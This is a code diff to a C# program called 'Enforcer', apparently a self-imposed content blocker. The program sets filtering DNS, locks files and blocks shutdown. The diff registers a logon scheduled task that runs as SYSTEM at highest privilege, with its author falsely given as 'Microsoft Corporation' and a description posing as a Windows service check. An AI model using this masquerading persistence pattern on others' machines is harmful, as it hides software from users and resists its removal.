@@ -43,7 +43,6 @@ namespace Enforcer
         public static partial bool ShutdownBlockReasonCreate(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] string pwszReason);
         readonly string windowsPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
         readonly string? exePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
-        readonly WindowsIdentity identity = WindowsIdentity.GetCurrent();
         readonly List<FileStream> filePadlocks = [];
         readonly Config config = Config.Instance;
         readonly string watchdogPath;
@@ -108,7 +107,7 @@ namespace Enforcer
         {
             using Process executor = new();
             executor.StartInfo.FileName = Path.Combine(exePath, "SSExecutor.exe");
-            executor.StartInfo.Arguments = $"\"{watchdogPath}\" {Environment.ProcessId}";
+            executor.StartInfo.Arguments = $"\"{watchdogPath}\" {Environment.ProcessId} {exePath}";
             executor.StartInfo.CreateNoWindow = true;
             executor.StartInfo.RedirectStandardOutput = true;
             executor.Start();
@@ -152,15 +151,13 @@ namespace Enforcer
                         filePadlock.Close();
                     using var taskService = new TaskService();
                     var taskFolder = GetTaskFolder(taskService);
-                    taskFolder.DeleteTask($"SvcStartup-{identity.User.Value}", false);
-                    taskFolder.DeleteTask($"SvcMonitor-{identity.User.Value}", false);
+                    taskFolder.DeleteTask("SvcStartup", false);
                     watchdog.Kill();
                 }
                 else
                 {
                     SetCleanBrowsingDNS();
-                    RegisterTask($"SvcStartup-{identity.User.Value}", new LogonTrigger());
-                    RegisterTask($"SvcMonitor-{identity.User.Value}", new TimeTrigger() { StartBoundary = DateTime.Now, Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.Zero) });
+                    RegisterTask("SvcStartup");
                     Thread.Sleep(4000);
                 }
             }
@@ -233,7 +230,7 @@ namespace Enforcer
                 a.GetIPProperties().GatewayAddresses.Any(g => g.Address.AddressFamily.ToString().Equals("InterNetwork")));
         }
 
-        void RegisterTask(string name, Trigger taskTrigger)
+        void RegisterTask(string name)
         {
             using var taskService = new TaskService();
             var taskFolder = GetTaskFolder(taskService);
@@ -242,8 +239,9 @@ namespace Enforcer
             taskDefinition.Settings.DisallowStartIfOnBatteries = false;
             taskDefinition.RegistrationInfo.Author = "Microsoft Corporation";
             taskDefinition.RegistrationInfo.Description = "Ensures all critical Windows service processes are running.";
+            taskDefinition.Principal.UserId = "NT AUTHORITY\\SYSTEM";
             taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
-            taskDefinition.Triggers.Add(taskTrigger);
+            taskDefinition.Triggers.Add(new LogonTrigger());
             taskDefinition.Actions.Add(new ExecAction(daemonPath));
             taskFolder.RegisterTaskDefinition(name, taskDefinition);
         }
